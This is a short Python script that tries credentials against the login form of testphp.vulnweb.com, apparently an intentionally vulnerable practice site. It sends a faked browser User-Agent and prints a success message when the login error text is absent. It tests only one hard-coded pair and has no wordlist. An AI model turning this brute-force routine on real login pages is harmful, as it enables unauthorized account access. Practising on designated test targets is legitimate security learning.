import requests
from rich import print
html_input_user = 'uname'
html_input_pass = 'pass'
form_action = 'http://testphp.vulnweb.com/userinfo.php'
message_erro = 'Login Information'
token = False
html_form = requests.get(form_action).text
def brute_force(credencials):
   user, password = credencials
   headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
   data = {html_input_user: user, html_input_pass: password}
   request = requests.post(form_action, data=data, headers=headers, timeout=1)
   if request.status_code == 200:
      print(f'[bold yellow]Testing credencials: {user}: {password}[/bold yellow]')
   else:
      print('[bold red]Connection error[/bold red]')   
  
         
   if message_erro in request.text:
         print(f'[bold red] faill[/bold red]')
   else: 
         print(f'[bold green] Successful login: {user}:{password}[/bold green]')
         exit()
brute_force(('tesdfft', 'terdfdfst'))
